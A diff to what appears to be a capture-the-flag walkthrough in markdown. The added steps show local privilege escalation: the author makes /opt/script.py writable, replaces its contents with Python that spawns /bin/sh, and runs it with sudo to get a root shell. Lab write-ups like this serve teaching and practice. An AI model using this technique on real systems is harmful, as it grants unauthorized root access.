@@ -87,7 +87,40 @@ export SHELL=bash
 sudo -l
 ```
 ![image](https://github.com/user-attachments/assets/0acfea2b-b7ff-45f0-8c93-9a9fec46d86d)
-![image](https://github.com/user-attachments/assets/33ce0d41-31af-49dd-8980-8d552bd1441b)
+
+## **we are going to view the file in question**
+```bash
+cd /opt
+ls -la
+```
+![image](https://github.com/user-attachments/assets/9c44abcb-7c88-4ebf-9d0f-0f51b92310df)
+
+## **We do not have write permissions**
+```bash
+chmod +w /opt/script.py
+```
+![image](https://github.com/user-attachments/assets/ac3b9578-615f-46c4-95b0-14e2fb68e03c)
+
+## **Now we can edit the script. we are going to write in the file a code that will allow us to get a shell as root: we will use echo to edit the file since we don't have any text editor. First we run:**
+```bash
+echo 'import os' > script.py
+```
+## **And then:**
+```bash
+echo 'os.system("/bin/sh")' >> script.py
+```
+## **Then we do a cat to the file to see if the changes were made correctly**
+```bash
+cat script.py
+```
+![image](https://github.com/user-attachments/assets/cfaebea9-592f-422e-8c53-d01be22311d3)
+
+## **Let's run the script with the following command to see if it worked correctly:**
+```bash
+sudo /usr/bin/python3 /opt/script.py
+```
+![image](https://github.com/user-attachments/assets/7e8e5e6b-9afe-4bfa-b14b-776fdfe2fdae)
+
 
 
 
